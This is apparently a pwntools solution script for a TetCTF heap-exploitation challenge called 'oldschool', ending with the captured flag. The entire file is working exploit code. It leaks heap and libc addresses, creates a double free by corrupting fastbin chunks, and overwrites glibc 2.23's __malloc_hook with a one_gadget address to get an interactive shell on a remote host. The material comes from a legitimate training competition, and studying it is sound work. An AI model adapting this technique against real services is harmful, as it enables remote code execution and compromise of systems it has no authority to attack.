from pwn import *

#r = process("./oldschool", env = {"LD_PRELOAD" : "./libc-2.23.so"})
r = remote("18.234.92.13", 19669)

def create(size, content):
    r.sendlineafter("choice: ", "1")
    r.sendlineafter("Size: ", str(size))
    if size != 0:
        r.sendafter("Content: ", content)
    
def edit(index, content, corrupt = False):
    r.sendlineafter("choice: ", "2")
    r.sendlineafter("edit: ", str(index))
    if corrupt == False:
        r.sendafter("content: ", content)
    
def show(index):
    r.sendlineafter("choice: ", "3")
    r.sendlineafter("show: ", str(index))

def delete(index):
    r.sendlineafter("choice: ", "4")
    r.sendlineafter("delete: ", str(index))
    
libc = ELF("./libc-2.23.so")
one_gadget_off = 0xf02a4 
free_hook_off = libc.symbols["__free_hook"]
malloc_hook_off = libc.symbols["__malloc_hook"]

# Create 2 fast chunks, delete them, create another one to leak heap
create(0x18, "a") #0
create(0x18, "b") #1
delete(0)
delete(1)
create(0x18, "a") #0
show(0)
r.recvuntil("Name: ")
heap = u64(r.recv(6) + '\0\0') - 0x61
log.info('heap = ' + hex(heap))
# Create an unsorted chunk and a fast chunk to leak libc
create(0x18, "b") #1
create(0x200, "c") #2
create(0x30, "d") #3
delete(2)
create(0x20, "c") #2
show(2)
r.recvuntil("Name: ")
libc_base = u64(r.recv(6) + '\0\0') - 3951971
log.info('libc = ' + hex(libc_base))
one_gadget = libc_base + one_gadget_off
malloc_hook = libc_base + malloc_hook_off
# Using edit and delete to achieve double free
create(0x1b0, "e") #4
create(0, "") #5
create(0x40, "f") #6
create(0x60, "g") #7
create(0x60, "h") #8
edit(5, "", True)
delete(6)
delete(5)
# Use the double freed chunk to fake a 0x71 fastbin chunk
create(0x18, p64(heap)) #5
create(0x18, "f") #6
delete(3)
create(0x18, p64(heap + 0x3f0) + p32(0x0)) #3
# Double freed the 0x71 fastbin chunk
edit(1, "", True)
delete(8)
delete(7)
# Use it to overwrite __malloc_hook with one_gadget
create(0x60, p64(malloc_hook - 35)) #7
create(0x60, "h") #8
delete(3)
create(0x60, "d") #3
create(0x60, "\x00"*19 + p64(one_gadget)) #9
delete(0)
# Call malloc, get shell
r.sendlineafter("choice: ", "1")

r.interactive()
# TetCTF{old_h3ap_t3chniqu3}



